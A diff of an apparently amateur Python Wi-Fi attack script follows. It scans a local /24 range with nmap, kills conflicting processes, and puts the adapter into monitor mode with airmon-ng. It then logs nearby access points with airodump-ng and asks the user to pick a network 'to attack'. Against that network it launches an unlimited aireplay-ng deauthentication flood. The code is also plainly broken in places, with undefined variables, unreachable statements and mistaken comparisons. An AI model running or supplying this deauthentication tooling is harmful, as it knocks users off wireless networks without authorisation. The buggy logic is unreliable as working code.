@@ -202,6 +202,8 @@ def install():
 
 ACTIVE_NETWORKS = []
 ACTIVE_LAN = []
+
+
 def arp_scan():
     ip_add_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
     port_range_pattern = re.compile(r"([0-9]+)-([0-9]+)")
@@ -212,7 +214,7 @@ def arp_scan():
     while True:
         print(f"**{yellow}**Enter the IP address for scanning  {reset}\n ")
         ip_add_entered = input('** ')
-        #sip_add_entered = ip_add_pattern.search(ip_add_entered)
+        # sip_add_entered = ip_add_pattern.search(ip_add_entered)
         if ip_add_pattern:
             print(f"{ip_add_entered} is a valid ip address")
             break
@@ -223,8 +225,7 @@ def arp_scan():
         port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
         print(type(port_range_valid))
         print(f'{yellow}The Ports Entered.. {reset}\n{port_range_valid}')
-       # port_range_valid = str(port_range_valid)
-
+        # port_range_valid = str(port_range_valid)
 
         if port_range_valid:
             port_min = int(port_range_valid.group(1))
@@ -232,14 +233,13 @@ def arp_scan():
             print(f'{yellow}[PORT-MIN]-- {reset}[{port_min}]\n{yellow}[PORT-MAX]{reset}{port_max}')
             break
 
-
     try:
         master_results = []
         print()
-        print('X'*50)
+        print('X' * 50)
         print(f'{yellow}**Parsing First Run.{reset}')
         nm = nmap.PortScanner()
-        ip_add_entered=str(ip_add_entered)
+        ip_add_entered = str(ip_add_entered)
         host = ip_add_entered + '/24'
         nm.scan(hosts=host, arguments='-n -sP -PE -PA21,23,80,3389')
         hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
@@ -262,7 +262,6 @@ def arp_scan():
 
     except:
         print('Error in running all_host arg')
-
 
         # protocol
     try:
@@ -327,25 +326,26 @@ def arp_scan():
 
     except KeyError as exkey:
         traceback.print_exc()
-        print("[!] Cannot scan host!: " , exkey)
+        print("[!] Cannot scan host!: ", exkey)
 
     for port in range(port_min, port_max + 1):
         try:
-            print('X'*50)
-            #port_max += 1
+            print('X' * 50)
+            # port_max += 1
             ip_add_entered = str(ip_add_entered)
             port = str(port)
             result = nm.scan(ip_add_entered, str(port))
-            print(f'**{yellow}All Dictinary Keys:: {reset} \n{[*result.values()]}') ## unpacks all dictinary keys
+            print(f'**{yellow}All Dictinary Keys:: {reset} \n{[*result.values()]}')  ## unpacks all dictinary keys
             print(result.keys())
-            print('X'*50)
-            print(f'{yellow}**[TARGET]-- {reset}[{ip_add_entered}]\n{yellow}*[PORT-MIN]{reset}{port_min} \n{yellow}*[PORT-MAX]{reset}{port_max}')
-            print('X'*50)
+            print('X' * 50)
+            print(
+                f'{yellow}**[TARGET]-- {reset}[{ip_add_entered}]\n{yellow}*[PORT-MIN]{reset}{port_min} \n{yellow}*[PORT-MAX]{reset}{port_max}')
+            print('X' * 50)
 
             print(f'{yellow}**[RESULTS]{reset}')
             print(result)
-            #print([(k, result[timestr]) for k in result])
-            #print(f'{yellow}**[CURRENT-PORT]{reset}\n{result["scaninfo"]}')
+            # print([(k, result[timestr]) for k in result])
+            # print(f'{yellow}**[CURRENT-PORT]{reset}\n{result["scaninfo"]}')
             print(f'{yellow}**[CURRENT-PORT]{reset}\n{port}')
 
             ## basic scan info
@@ -356,9 +356,8 @@ def arp_scan():
             all_hosts = nm.all_hosts()
             print(f'{yellow}**[ALL-HOSTS]{reset}\n{all_hosts}')
 
-
             print(f'{yellow}**[ELAPSED-TIME]{reset}\n{port}')
-            print('X'*50)
+            print('X' * 50)
             print(list(result.values()))
             master_results.append(result)
 
@@ -411,9 +410,6 @@ def arp_scan():
         except Exception as e:
             traceback.print_exc()
             print(f"{red}**ERROR IN NMAP SCAN[{port}]{reset}.\n[{e}]")
-
-
-
 
 
 # TO AVOID SSID DUPLICATIONS- #pass ssid % list
@@ -512,14 +508,17 @@ except Exception as EX:
 else:
     print('X' * 50)
     try:  ## try, else except
+        global AVAILABLE_NICS
+        AVAILABLE_NICS = []
+
         current_time = time.time()
         clock_time = time.ctime(current_time)
         print(f'{yellow}**Your OS {current_platform} || Platform {platform_name}  \n{clock_time}')
         if 'linux' in platform_name or 'Linux' in current_platform:
             print(f'{yellow}**Detected Linux, auto compliling IW-CONFIG. {reset}')
             interface_UBUNTU = re.compile(r"^wlo[0-9]")  ##### UBUNTU
-
             nic = interface_UBUNTU.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
+            AVAILABLE_NICS.append(nic)
 
         else:
             print('X' * 50)
@@ -539,6 +538,11 @@ else:
                 if len(nic) == 0:
                     continue
                 elif len(nic) != 0:
+                    AVAILABLE_NICS.append('USER_INPUT: ' + nic)
+                    AVAILABLE_NICS.append('UBUNTU_NIC: ' + str(possible_nic01))
+                    AVAILABLE_NICS.append('KALI_NIC: ' + str(possible_nic00))
+                    print(f'{yellow}**Available Nics: {reset}\n {AVAILABLE_NICS}')
+                    time.sleep(3)
                     flag00 = False
                 break
 
@@ -551,6 +555,7 @@ else:
         nic = nic.replace("'", "")
         print('String Nic,', nic)
         print(), print()
+        time.sleep(1)
     except EOFError as EOF:
         traceback.print_exc()
         print(str(EOF))
@@ -565,17 +570,17 @@ else:
 ## ################################################################ ##
 
 
-
 try:
 
     interface_gateway = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
     default_gateway = interface_gateway.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
+    #  default_gateway = interface_gateway.findall(subprocess.run(['iwconfig'], capture_output=True, text=True)#.stdout.decode())
     print(f'{yellow}**Available IPs{reset}\n{default_gateway}')
     print(type(default_gateway))
 
     with Spinner():
-        afirm = ['Yes','yes','y']
-        negat = ['N','NO','n','no']
+        afirm = ['Yes', 'yes', 'y']
+        negat = ['N', 'NO', 'n', 'no']
         print(f'{yellow} Start [ARP-SCAN] (Y/N)? {reset}')
         arp = input('** ')
         if arp in afirm:
@@ -601,20 +606,21 @@ try:
                 #  print(f'[SYSTEM] {current_files}')
                 print(f'{yellow} :: Current Files in Directory ::{reset}\n {current_files}')
                 # to get current directory
-                directory = os.getcwd()
                 backup = pathlib.PurePath('/backup/')
+                directory = os.getcwd()
                 time.sleep(2)
                 if backup not in os.walk(directory):
                     try:
-
-                        os.mkdir(directory + "/backup/")
+                        backup = pathlib.PurePath('/backup/')
+                        backup_dir = directory + str(backup)
+                        os.mkdir(backup_dir, 777)
                         timestamp = datetime.now()
                         shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
-                        print(f'**{yellow}**Created backup file in:{reset} \n[{directory + backup}]')
-                        time.sleep(1)
+                        print(f'**{yellow}**Created backup file in:{reset} \n[{backup_dir}]')
+                        time.sleep(2.5)
                         break
                     except:
-                        print(f'{red}**Folder already exists{reset}')
+                        print(f'{red}**  Folder already exists **{reset}\n[{backup}]')
                         break
                 else:
                     print(f'**{red}.csv found in directory. moving it to backup folder. {reset}')
@@ -628,8 +634,8 @@ except IOError as e:
 ############################################################################### ##
 ## ADD LOGIC TO DETERMIN KALI / UBUNTU USING PLATFORM ##
 
-else:
-    try:
+else:  # final else
+    try:  # try except
         time.sleep(3)
         run_discovery = True
         while run_discovery:
@@ -638,7 +644,7 @@ else:
             signal = True
             for file_name in os.listdir(cwd):
                 if signal is False:
-                    pass
+                    break
                 while signal:  # check for old .csv. check for backup folder. create back up folder. move old .csv
                     if 'attack.csv' in file_name:
                         print(f'{yellow}**Found old attack.csv in{reset}\n {cwd}')
@@ -646,7 +652,7 @@ else:
                         time.sleep(1)
                         backup_time = datetime.now()
                         backup_time = str(backup_time)
-                       # global backup_loc
+                        # global backup_loc
                         backup_loc = cwd + '/DOS_BACKUP' + backup_time
                         os.mkdir(backup_loc)
                         if os.path.isdir(backup_loc):
@@ -656,6 +662,7 @@ else:
                                 if os.path.isfile('attack.csv'):
                                     print(
                                         f'{yellow}**Succesfully Moved CSV to backup folder{reset} \n at{red} [TIME]--{backup_time} :: [DIR] {backup_loc} {reset}\n')
+                                    time.sleep(3)
                                     signal = False
                                     pass
                     else:
@@ -665,27 +672,36 @@ else:
                         print(f'{red}**Did not find a directory, searching for one.. {reset}')
                         print(f'{yellow}*Refer to {directory} && {cwd} for reference {reset} \n*{current_clock}')
                         file = open('attack.csv', 'w')
-                        if os.path.isfile(file):
+                        file.close()
+                        break
+                        signal = False
+                        if os.path.isfile(cwd):
                             print(f'{yellow}**Created attack.csv in:{reset} \n {cwd}')
                             time.sleep(1)
                             file.close()
                             signal = False
                             pass
-    #  except Exception as e:s
-    except:
+
+
+    except Exception as e:
         traceback.print_exc()
-        print(f'{red}**Error, must have input{reset}')
+        print(f'{red}**[ERROR]-- In Creating Backup Directory. {reset}\n {e}')
         pass
-    else:
+
+    finally:
         display_header()
         period_wait()
-        params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
-                  'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']
-        print(f'{yellow} :: LIST PARAMS :: {reset} \n{params}')
         print(f'{yellow} :: Your NIC :: {reset}\n {nic}')
         print(f'{yellow} {type(nic)} {reset}'), print()
         print('X' * 50)
         print(f'**{yellow}**Wifi adapter now connected, staring processes.{reset}')
+        time.sleep(5)
+
+# except Exception as e:
+#     traceback.print_exc()
+#     print(f'{red}**[ERROR]-- In Creating Backup Directory. {reset}\n {e}')
+#     pass
+#
 
 ######################################################## ##
 ######################################################## ##
@@ -694,129 +710,151 @@ else:
 
 try:
     with Spinner():
+        AIR_MON = True
+        while AIR_MON:
+            ####### DISPLAY CONFLICTING SUBPROCESSES #########
+            display_conflict = subprocess.run(['sudo', 'airmon-ng', 'check'], capture_output=True, text=True)
+            if display_conflict:
+                print(f'{yellow} :: Conflicting Subprocesses :: {reset}')
+                print(display_conflict)
+                time.sleep(3)
+            else:
+                print(f'{red} :: No conflicting subprocesses :: {reset}')
 
-        ####### DISPLAY CONFLICTING SUBPROCESSES #########
-        display_conflict = subprocess.run(['sudo', 'airmon-ng', 'check'])
-        if display_conflict:
-            print(f'{yellow} :: Conflicting Subprocesses :: {reset}')
-            print(display_conflict)
-            time.sleep(3)
-        else:
-            print(f'{red} :: No conflicting subprocesses :: {reset}')
-
-        ############# KILL PROCESS ###################
-        kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
-        if kill_process:
-            print(f'{yellow} :: Killing System Processes ::')
-            print(kill_process)
-        #  run_discovery = False
-        # break
-        else:
-            print(f'{red}**No subprocess to kill{reset}')
-            # run_discovery = False
+            ############# KILL PROCESS ###################
+            kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
+            if kill_process:
+                print(f'{yellow} :: Killing System Processes ::')
+                print(kill_process)
+            #  run_discovery = False
             # break
+            else:
+                print(f'{red}**No subprocess to kill{reset}')
 
-            ########### START##################
-        start = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
-        if start:
-            print(f'**{yellow}**[Succesfully Started Airmon-NG]** {reset}')
-            print(start)
-        else:
-            print(f'{red}**monitored mode failed{reset}')
+                ########### START MONITOR MODE##################
 
-        ######### START SEQUENCE FOR DISCOVER AP #######
-        discover_ap = subprocess.Popen(
-            ['sudo', 'airodump-ng', '-w', 'attack', '--write-interval', '1', '--output-format', 'csv',
-             nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
-        if discover_ap:
-            print(f'**{yellow}**[DISCOVERED AP]** {reset}')
+            print(f'{yellow}**[--INITIATING MONITORED MODE--]{reset}')                                        # capture_output = True, text = True
 
-        ##########################################################################
-        for root, dirs, file  in os.walk(cwd):
-            if 'attack.csv' in file:
-                print(f'{yellow}**Found [attack.csv] in directory, moving on.. ')
-                time.sleep(1)
-                break
-            elif "attack.csv" not in file:
-                print(f'{red}** Did not file a old .csv , searching for one.. {reset}')
-                csv_loc = cwd + 'attack.csv'
-                file00 = open('attack.csv', 'w')
-                if file00:
-                    print(f'{yellow}**The .csv is in: {reset} \n*{csv_loc}')
+            time.sleep(3)
+            start = subprocess.run(['sudo', 'airmon-ng', 'start', nic], capture_output=True, text=True)
+            if start:
+                print(f'**{yellow}**[Successfully Started Airmon-NG]** {reset}')
+                time.sleep(.1)
+                pprint.pprint(start)
+                print(f'{start}')
+            else:
+                print(f'{red}**[MONITORED-MODE-FAILED]{reset}')
+
+            ######### START SEQUENCE FOR DISCOVER AP #######
+            print(f'{yellow}**[--INITIATING DISCOVER_AP SEQUENCEE--]{reset}')
+            time.sleep(3)
+            discover_ap = subprocess.Popen(
+                ['sudo', 'airodump-ng', '-w', 'file', '--write-interval', '1', '--output-format', 'csv',
+                 nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
+            if discover_ap:
+                print(f'**{yellow}**[DISCOVERED AP]** {reset}')
+                time.sleep(.1)
+
+            ##########################################################################
+            for root, dirs, file in os.walk(cwd):
+                if 'attack.csv' in file or 'attack.csv' in dirs:
+                    print(f'{yellow}**Found [attack.csv] in directory, moving on.. ')
                     time.sleep(1)
-                    file00.close()
                     break
-
-
-        with 'attack.csv' in os.listdir(cwd) as csv_h:
-            for index, result in enumerate(nic):
-                print(f'{bblue}{index} || {result}{reset}')
-                # with open('attack.csv') as csv_h:
-                csv_h.seek(0)
-                csv_reader = csv.DictReader(csv_h, field_names=params)
-                for row in csv_reader:
-                    if row['BSSID'] == 'BSSID':  # skip bssid, its already listed.
-                        print(f'{yellow} found [BSID] in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
-                        ACTIVE_NETWORKS.append(row)
-                    elif row in ['BSSID'] == 'Station MAC':  ## GETS RID OF CLIENT DATA.
-                        print(
-                            f'{yellow} found [BSID] (MACHINE-MAC) in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
-                        ACTIVE_NETWORKS.append(row)
+                elif "attack.csv" not in file or 'attack.csv' not in dirs:
+                    print(f'{red}** Did not file a old .csv , searching for one.. {reset}')
+                    csv_loc = cwd + 'attack.csv'
+                    file00 = open('attack.csv', 'w')
+                    file00.close()
+                    if file00 is 'attack.csv':
+                        print(f'{yellow}**The .csv is in: {reset} \n*{csv_loc}')
+                        time.sleep(2)
+                        file00.close()
                         break
-                    elif check_wifi(row['ESSID'], ACTIVE_NETWORKS):
-                        print(f'{yellow} found ESSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
-                        ACTIVE_NETWORKS.append(row)
-                    elif check_wifi(row['SSID'], ACTIVE_NETWORKS):
-                        print(f'{yellow} found SSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
-                        ACTIVE_NETWORKS.append(row)
-                    elif check_wifi(row['LAN_IP'], ACTIVE_NETWORKS):
-                        print(f'{yellow} found LAN_IP in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
-                        ACTIVE_NETWORKS.append(row)
 
-                print(
-                    f'**{yellow}Scanning. Press control+ when you want to select the network you want to attack.{reset}\n')
-                print("No |\tBSSID              |\tChannel|\tESSID                         |")
-                print("___|\t___________________|\t_______|\t______________________________|")
-                print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
+            if os.path.isfile('attack.csv'):
+                print(f'{yellow}**[--FOUND ATTACK.CSV--]{reset}')
+                time.sleep(.5)
+                with open('attack.csv') as csv_h: # in os.listdir(cwd) as csv_h:
+                    params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
+                              'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']
 
-                try:
-                    for index, item in enumerate(ACTIVE_NETWORKS):
-                        print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
-                        active_network = True
-                        while active_network:
-                            if KeyboardInterrupt:
-                                print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
+                    csv_reader = csv.DictReader(csv_h, fieldnames=params)  ## map the key values to params
+
+                    print(f'{yellow} :: LIST PARAMS :: {reset} \n{params}')
+                    print(f'{yellow} :: Your NIC :: {reset}\n {nic}')
+                    print(f'{yellow} {type(nic)} {reset}'), print()
+                    csv_h.seek(0)
+                    print(f'{yellow} CSV-H ENUM\n {csv_h}')
+
+                    for index, result in enumerate(nic):
+                        print(f'{bblue}{index} || {result}{reset}')
+                        # with open('attack.csv') as csv_h:
+                        for row in csv_reader:
+                            if row['BSSID'] == 'BSSID':  # skip bssid, its already listed.
+                                print(f'{yellow} found [BSID] in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
+                                ACTIVE_NETWORKS.append(row)
+                            elif row in ['BSSID'] == 'Station MAC':  ## GETS RID OF CLIENT DATA.
+                                print(
+                                    f'{yellow} found [BSID] (MACHINE-MAC) in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
+                                ACTIVE_NETWORKS.append(row)
+                                break
+                            elif check_wifi(row['ESSID'], ACTIVE_NETWORKS):
+                                print(f'{yellow} found ESSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
+                                ACTIVE_NETWORKS.append(row)
+                            elif check_wifi(row['SSID'], ACTIVE_NETWORKS):
+                                print(f'{yellow} found SSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
+                                ACTIVE_NETWORKS.append(row)
+                            elif check_wifi(row['LAN_IP'], ACTIVE_NETWORKS):
+                                print(f'{yellow} found LAN_IP in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
+                                ACTIVE_NETWORKS.append(row)
+
+                        print(
+                            f'**{yellow}Scanning. Press control+ when you want to select the network you want to attack.{reset}\n')
+                        print("No |\tBSSID              |\tChannel|\tESSID                         |")
+                        print("___|\t___________________|\t_______|\t______________________________|")
+                        print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')
+
+                    try:
+                        for index, item in enumerate(ACTIVE_NETWORKS):
+                            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+                            active_network = True
+                                # if KeyboardInterrupt:
+                                #     print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
+                                #     traceback.print_exc()
+                                #     active_network = False
+                                #     choice = input("[SYSTEM] Please make a choice from above. ")
+                            try:
+                                if ACTIVE_NETWORKS[int(choice)]:
+                                    hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
+                                    hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
+                                    subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
+                                    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
+                                                    AVAILABLE_NICS[int(nic)] + "mon"], stdout=PIPE, stdin=PIPE,
+                                                   stderr=PIPE)
+
+                                    # capture_output = True, text = True
+                                    time.sleep(1)
+                                    continue
+                            except Exception as error:
                                 traceback.print_exc()
-                                active_network = False
-                                choice = input("[SYSTEM] Please make a choice from above. ")
-                                try:
-                                    if ACTIVE_NETWORKS[int(choice)]:
-                                        hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
-                                        hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
-                                        subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
-                                        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
-                                                        wifi_result[int(wifi_interface_choice)] + "mon"])
-                                        time.sleep(1)
-                                        continue
-                                except Exception as error:
-                                    traceback.print_exc()
-                                    print(f'{red}** ERROR IN ACTIVE_NETWORK PARSING \n{str(error)}{reset}')
+                                print(f'{red}** ERROR IN ACTIVE_NETWORK PARSING \n{str(error)}{reset}')
 
-                except Exception as error:
-                    traceback.print_exc()
-                    print(f'{red}**{str(error)}{reset}')
+                    except Exception as error:
+                        traceback.print_exc()
+                        print(f'{red}**{str(error)}{reset}')
 
-                except KeyboardInterrupt:  ### keyboard interupt --> disable monitormode
-                    print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
-                    traceback.print_exc()
-                    pprint.pprint(ACTIVE_NETWORKS)
-                    ## DISABLE MONITORED MODE
-                    print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
-                    disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
-                    if disable_monitor:
-                        print(f'{red}**Successfully Killed Monitoring Process{reset}')
-                        print(f'{red}*Breaking Loop{reset}')
-                        run_discovery = False
+                    except KeyboardInterrupt as Keyboard:  ### keyboard interupt --> disable monitormode
+                        print(f'\n{red}[SYSTEM] USER EXIT\n Keyboard.{reset}')
+                        traceback.print_exc()
+                        pprint.pprint(ACTIVE_NETWORKS)
+                        ## DISABLE MONITORED MODE
+                        print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
+                        disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
+                        if disable_monitor:
+                            print(f'{red}**Successfully Killed Monitoring Process{reset}')
+                            print(f'{red}*Breaking Loop{reset}')
+                            run_discovery = False
 
 except Exception as final_error:
     traceback.print_exc()
